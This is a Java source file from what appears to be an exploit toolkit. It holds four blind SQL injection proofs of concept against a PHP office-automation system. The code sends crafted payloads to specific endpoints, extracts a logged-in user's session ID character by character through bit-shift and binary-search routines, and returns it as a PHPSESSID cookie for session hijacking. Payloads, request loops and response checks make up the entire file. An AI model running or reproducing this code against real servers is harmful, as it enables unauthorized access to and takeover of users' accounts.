package com.xinyu.poc;

import com.xinyu.tools.Request;
import com.xinyu.tools.Response;

/**
 * SQL注入漏洞类(已完成)
 */
public class SQLInjection {
    public static String getSession(String url, String poc) {
        System.out.println("当前传入的poc编号" + poc);
        if (poc.equals("poc1")) {
            return poc1(url);
        } else if (poc.equals("poc2")) {
            return poc2(url);
        } else if (poc.equals("poc3")){
            return poc3(url);
        } else if (poc.equals("poc4")){
            return poc4(url);
        }else {
            System.out.println("未知的POC编号");
            return null;
        }
    }

    private static String poc1(String url) {
        String params = "_SERVER[QUERY_STRING]=kname=1'+and@`'`+or+if(ascii(substr((select+SID+from+user_online+limit+1),%d,1))<<%d>>63=0,1,exp(710))#";
        String cookie = bitOperation(url + "/general/document/index.php/setting/keywords/index", params);
        if (cookie != null) {
            cookie = "PHPSESSID=" + cookie;
        }
        return cookie;
    }

    private static String poc2(String url) {
        String params = "title)values(\"'\"^exp(if((ascii(substr((select/**/SID/**/from/**/user_online/**/limit/**/1),%d,1))<<%d>>63keng0),1,710)))#=1&_SERVER=";
        String cookie = bitOperation(url + "/general/document/index.php/recv/register/insert", params);
        if (cookie != null) {
            cookie = "PHPSESSID=" + cookie;
        }
        return cookie;
    }

    private static String poc3(String url){
        // 这个 payload 用来注入获取 sessionid
        String params = "_GET[username]=admin' and  if(hex(substr((select SID from user_online limit 1),%d,1))>'%s',1,power(9999,99)) and '1";
        // 这个 payload 用于检测是否存在在线用户
        String payload = "_GET[username]=admin' and (select count(SID) from user_online limit 1) >0 and '1";
        String cookie = dichotomy(url+"/ispirit/retrieve_pwd.php?",params, payload);
        if (cookie != null) {
            cookie = "PHPSESSID=" + cookie;
        }
        return cookie;
    }

    private static String poc4(String url){
        // 这个 payload 用来注入获取 sessionid
        String payload = "APP_UNIT=%2527 and if((select count(SID) from user_online limit 1)>0%252C1%252Cpower(9999%252C99)) and %25271";
        // 这个 payload 用于检测是否存在在线用户
        String params = "APP_UNIT=keng2527 and if(hex(substr((select SID from user_online limit 1)keng252c%dkeng252c1))>keng2527%skeng2527keng252c1keng252cpower(9999keng252c99)) and keng2527";

        String cookie = dichotomy(url+"/interface/go.php?", params, payload);
        if (cookie != null) {
            cookie = "PHPSESSID=" + cookie;
        }
        return cookie;
    }

    /**
     * 核心SQL注入方法
     *
     * @param url
     * @param params
     * @return
     */
    private static String bitOperation(String url, String params) {
        String result = "";  //SQL注入获取的字符
        //外层循环由查询结果字符的长度控制,此处获取的SESSION为固定的26位
        for (int len = 1; len <= 26; len++) {
            String str = "0";
            //内层循环即为固定的7次位运算,每循环结束一次即可获得一个字符
            for (int bit = 57; bit <= 63; bit++) {
                String payload = String.format(params, len, bit);  //替换占位符,得到填充后的新字符串(不改变原字符串)

                //---占位符与poc2-payload中的%号冲突,暂未解决,临时处理---
                payload = payload.replace("keng", "%3d");

                Response response = Request.post(url, payload); //发送请求
                //200为poc1的判断条件,302为poc2的判断条件
                if (response.getCode() == 200 || response.getCode() == 302) {
                    str += "0";
                } else {
                    str += "1";
                }
            }
            int ascii = Integer.parseInt(str, 2); //二进制转换成十进制
            result += (char) ascii; //十进制ascii码转换成对应的字符,累加到result变量上
            System.out.println(result);
            if (ascii == 0 || ascii == 127) {
                System.out.println("SESSION获取失败,该系统当前无已登录成功的账户...");
                result = null;
                break;
            }
        }
        return result;
    }

    private static String dichotomy(String url, String params,String payload){
        String result = "";

        // 先检测是否存在在线用户
        Response  response = Request.get(url + payload);
        String RespText = response.getText();
        if (!RespText.contains("互联互通访问接口的用户名或密码有误") && !RespText.contains("电子邮件外发默认邮箱")){
            System.out.println("SESSION获取失败,该系统当前无已登录成功的账户...");
            return null;
        }


        // 确认存在登录的用户则使用二分法进行注入
        for (int len = 1; len <= 26; len++) {
            int min = 44;
            int max = 122;
            int mid;
            while (true){
                mid = (max + min)/2;
                if (mid==min){break;}
                payload = String.format(params, len,Integer.toHexString(mid));

                //---占位符与poc4-payload中的%号冲突,暂未解决,临时处理---
                payload = payload.replace("keng", "%");

                response = Request.get(url + payload);
                RespText = response.getText();
                if (RespText.contains("错误，请联系管理员")){
                    max = mid;
                }else {
                    min = mid;
                }
            }
            result += (char) (mid+1);
            System.out.println(result);
        }
        return result;
    }

}
